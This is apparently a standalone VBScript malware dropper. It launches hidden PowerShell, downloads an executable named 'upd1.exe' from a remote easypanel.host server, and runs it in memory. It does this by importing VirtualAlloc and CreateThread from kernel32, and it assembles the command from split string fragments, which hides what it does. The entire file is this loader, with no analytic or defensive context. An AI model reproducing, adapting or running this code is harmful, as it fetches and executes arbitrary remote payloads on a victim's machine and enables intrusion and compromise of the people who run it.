Set sh = CreateObject("WScript.Shell")
a = "powershell -NoExit -Command ""$b=(New-Object Net.WebClient)."
b = "DownloadData('https://automacoes-remote-control.sgploq.easypanel.host/upd1.exe');"
c = "Add-Type 'class K{[DllImport("
q = Chr(92) & Chr(34)
d = "kernel32.dll" & q
e = ")]public static extern IntPtr VirtualAlloc(IntPtr a,UInt32 s,UInt32 t,UInt32 p);"
f = "public static extern IntPtr CreateThread(IntPtr a,UInt32 s,IntPtr f,"
g = "IntPtr b,UInt32 c,ref IntPtr d)}';"
h = "$m=[K]::VirtualAlloc(0,[uint32]$b.Length,12288,64);"
i = "[Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);"
j = "$d=[IntPtr]::Zero;[void][K]::CreateThread(0,0,$m,0,0,[ref]$d)"""
sh.Run a & b & c & q & d & e & f & g & h & i & j, 1, False
